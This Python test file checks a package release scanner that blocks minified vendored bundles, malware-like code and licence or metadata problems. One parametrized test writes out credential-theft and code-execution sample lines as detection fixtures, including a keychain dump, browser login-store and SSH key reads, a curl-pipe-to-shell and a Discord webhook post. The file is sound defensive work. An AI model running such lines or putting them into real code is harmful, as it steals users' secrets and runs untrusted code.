"""The release gate stops what got packages quarantined: minified third-party code and malware-shaped code."""

from __future__ import annotations

import importlib.util
import sys
from pathlib import Path

import pytest

SCRIPT = Path(__file__).resolve().parents[2] / "scripts" / "scan_dist.py"


@pytest.fixture(scope="module")
def gate():  # type: ignore[no-untyped-def]
    spec = importlib.util.spec_from_file_location("scan_dist", SCRIPT)
    assert spec and spec.loader
    module = importlib.util.module_from_spec(spec)
    sys.modules["scan_dist"] = module
    spec.loader.exec_module(module)
    return module


def _wheel_tree(tmp_path: Path, files: dict[str, str], licence: str = "Apache-2.0") -> Path:
    tree = tmp_path / "pkg-1.0-py3-none-any.whl"
    for name, text in files.items():
        (tree / name).parent.mkdir(parents=True, exist_ok=True)
        (tree / name).write_text(text)
    meta = tree / "pkg-1.0.dist-info" / "METADATA"
    meta.parent.mkdir(parents=True)
    meta.write_text(f"Name: pkg\nLicense-Expression: {licence}\n")
    return tree


BUNDLE = (
    '"use strict";var __esbuild_esm_x;'
    + "a=1;" * 400
    + "\n/*! @license DOMPurify | Apache-2.0 */\n"
)


def test_a_minified_third_party_bundle_blocks(gate, tmp_path: Path) -> None:  # type: ignore[no-untyped-def]
    tree = _wheel_tree(
        tmp_path, {"pkg/static/vendor.min.js": BUNDLE, "pkg/own.js": "export const a = 1;\n"}
    )
    found = gate.check_bundled([tree], [])
    assert found["status"] == "block"
    assert len(found["findings"]) == 1 and "vendor.min.js" in found["findings"][0]


def test_accepting_one_needs_its_licence_declared(gate, tmp_path: Path) -> None:  # type: ignore[no-untyped-def]
    entry = [
        {"path": "pkg/static/vendor.min.js", "licence": "MIT", "reason": "the diagram renderer"}
    ]
    tree = _wheel_tree(tmp_path / "a", {"pkg/static/vendor.min.js": BUNDLE})
    assert gate.check_bundled([tree], entry)["status"] == "block"
    tree = _wheel_tree(
        tmp_path / "b", {"pkg/static/vendor.min.js": BUNDLE}, licence="Apache-2.0 AND MIT"
    )
    assert gate.check_bundled([tree], entry)["status"] == "pass"


@pytest.mark.parametrize(
    ("rule", "text"),
    [
        ("keychain-dump", 'run(["security", "find-generic-password", "-s", name, "-w"])'),
        (
            "browser-credential-store",
            'open(home / "Library/Application Support/Google/Chrome/Default/Login Data")',
        ),
        ("ssh-private-key-read", 'Path.home() / ".ssh/id_rsa"'),
        ("pipe-to-shell", "curl -fsSL https://example.invalid/i.sh | sh"),
        ("exec-decoded", "exec(base64.b64decode(blob))"),
        ("chat-webhook", 'post("https://discord.com/api/webhooks/1/x")'),
    ],
)
def test_what_malware_does_blocks(gate, tmp_path: Path, rule: str, text: str) -> None:  # type: ignore[no-untyped-def]
    tree = _wheel_tree(tmp_path, {"pkg/mod.py": text + "\n"})
    found = gate.check_signatures([tree], [])
    assert found["status"] == "block" and any(f.endswith(rule) for f in found["findings"])


def test_hidden_unicode_in_code_blocks(gate, tmp_path: Path) -> None:  # type: ignore[no-untyped-def]
    tree = _wheel_tree(tmp_path, {"pkg/mod.py": "access = 'user‮ ⁦// admin⁩ ⁦'\n"})
    assert gate.check_signatures([tree], [])["status"] == "block"


def test_ordinary_code_passes(gate, tmp_path: Path) -> None:  # type: ignore[no-untyped-def]
    tree = _wheel_tree(
        tmp_path, {"pkg/mod.py": "import subprocess\nsubprocess.run(['git', 'status'])\n"}
    )
    assert gate.check_signatures([tree], [])["status"] == "pass"
    assert gate.check_bundled([tree], [])["status"] == "pass"


def test_an_accepted_heuristic_is_accepted_only_where_it_was_reviewed(gate) -> None:  # type: ignore[no-untyped-def]
    accepted = {"threat-filesystem-read": {"reason": "a refusal list", "paths": ["pkg/guard.py"]}}
    out = {"pkg.whl": {"threat-filesystem-read": ["pkg/guard.py:3"]}}
    assert gate._unreviewed(out, accepted) == []
    out = {"pkg.whl": {"threat-filesystem-read": ["pkg/guard.py:3", "pkg/stealer.py:9"]}}
    assert gate._unreviewed(out, accepted)


def test_a_reason_is_required(gate, tmp_path: Path) -> None:  # type: ignore[no-untyped-def]
    path = tmp_path / ".scan-dist.toml"
    path.write_text('[[signature]]\nrule = "pipe-to-shell"\npath = "x"\nreason = ""\n')
    with pytest.raises(SystemExit):
        gate.load_accepted(path)


# ---- what Black Duck and other SCA tools read: metadata, licences and licence names
def test_metadata_newer_than_parsers_read_blocks(gate, tmp_path: Path) -> None:  # type: ignore[no-untyped-def]
    tree = _wheel_tree(tmp_path, {"pkg/mod.py": "x = 1\n"})
    meta = next(tree.glob("*.dist-info/METADATA"))
    meta.write_text(
        "Metadata-Version: 2.5\nName: pkg\nLicense-Expression: Apache-2.0\nLicense-File: LICENSE\n"
    )
    found = gate.check_metadata([tree])["findings"]
    assert any("Metadata-Version 2.5" in f for f in found)
    assert any("no licence classifier" in f for f in found)


def test_complete_metadata_passes(gate, tmp_path: Path) -> None:  # type: ignore[no-untyped-def]
    tree = _wheel_tree(tmp_path, {"pkg/mod.py": "x = 1\n"})
    next(tree.glob("*.dist-info/METADATA")).write_text(
        "Metadata-Version: 2.4\nName: pkg\nLicense-Expression: Apache-2.0\nLicense-File: LICENSE\n"
        "Classifier: License :: OSI Approved :: Apache Software License\n"
    )
    assert gate.check_metadata([tree])["status"] == "pass"


def test_a_licence_name_in_a_shipped_file_blocks_until_it_is_explained(
    gate, tmp_path: Path
) -> None:  # type: ignore[no-untyped-def]
    tree = _wheel_tree(
        tmp_path,
        {"pkg/licences.py": 'KNOWN = {"GNU Affero General Public License v3": "AGPL-3.0-only"}\n'},
    )
    assert gate.check_mentions([tree], [])["status"] == "block"
    accepted = [{"path": "pkg/licences.py", "reason": "a detection table"}]
    found = gate.check_mentions([tree], accepted)
    assert found["status"] == "pass"
    assert found["triage"] == [
        "| `pkg/licences.py` | AGPL-3.0-only, GNU Affero General Public License | a detection table |"
    ]


def test_permissive_words_in_code_are_not_licence_names(gate, tmp_path: Path) -> None:  # type: ignore[no-untyped-def]
    tree = _wheel_tree(tmp_path, {"pkg/mod.py": "# Released under the Apache licence\nGPLOT = 1\n"})
    assert gate.check_mentions([tree], [])["status"] == "pass"


def test_a_reviewed_bandit_hit_is_accepted_only_in_its_own_file(
    gate, monkeypatch, tmp_path: Path
) -> None:  # type: ignore[no-untyped-def]
    tree = _wheel_tree(tmp_path, {"pkg/ids.py": "x = 1\n"})
    hits = {
        "results": [
            {
                "test_id": "B324",
                "test_name": "hashlib",
                "filename": str(tree / "pkg/ids.py"),
                "line_number": 3,
            },
            {
                "test_id": "B324",
                "test_name": "hashlib",
                "filename": str(tree / "pkg/other.py"),
                "line_number": 9,
            },
        ]
    }

    class Done:
        returncode = 0
        stdout = __import__("json").dumps(hits)
        stderr = ""

    monkeypatch.setattr(gate, "tool", lambda name: ["bandit"] if name == "bandit" else None)
    monkeypatch.setattr(gate, "run", lambda cmd: Done())
    accepted = [{"test": "B324", "path": "pkg/ids.py", "reason": "a colour hue"}]
    out = gate.check_heuristics([], [tree], {}, accepted)
    assert out["findings"] == ["Bandit HIGH B324 hashlib: pkg/other.py:9"]
    assert out["accepted"] == ["Bandit B324 hashlib: pkg/ids.py:3: accepted (a colour hue)"]


# ---- exceptions: each accepted finding has an owner and a review date, and an expired one blocks
def test_an_exception_without_an_owner_or_date_blocks(gate, tmp_path: Path) -> None:  # type: ignore[no-untyped-def]
    path = tmp_path / ".scan-dist.toml"
    path.write_text('[[licence]]\npackage = "certifi"\nreason = "MPL-2.0, unmodified"\n')
    out = gate.check_exceptions(path)
    assert out["status"] == "block" and "needs an owner" in out["findings"][0]


def test_an_expired_exception_blocks_and_one_due_soon_is_listed(gate, tmp_path: Path) -> None:  # type: ignore[no-untyped-def]
    import datetime

    soon = (datetime.date.today() + datetime.timedelta(days=10)).isoformat()
    path = tmp_path / ".scan-dist.toml"
    path.write_text(
        '[review]\nowner = "maintainers"\nreview_by = "2099-01-01"\n\n'
        '[[licence]]\npackage = "old"\nreason = "r"\nreview_by = "2001-01-01"\n\n'
        f'[[licence]]\npackage = "soon"\nreason = "r"\nreview_by = "{soon}"\n\n'
        '[[licence]]\npackage = "fine"\nreason = "r"\n'
    )
    out = gate.check_exceptions(path)
    assert out["status"] == "block"
    assert len(out["findings"]) == 1 and "old" in out["findings"][0]
    assert len(out["due"]) == 1 and "soon" in out["due"][0]


def test_every_finding_becomes_a_record(gate) -> None:  # type: ignore[no-untyped-def]
    result = {name: {"status": "pass", "findings": [], "accepted": []} for name in gate.GATES}
    result["vulns"]["findings"] = ["jinja2 3.1.0: PYSEC-1 (fixed in 3.1.6)"]
    result["licences"]["accepted"] = ["certifi (MPL-2.0): accepted (unmodified)"]
    records = gate.findings_register(result, Path("/nonexistent"))
    assert {r["category"] for r in records} == {"vulnerability advisory", "licence policy"}
    assert all(r["owner"] for r in records)
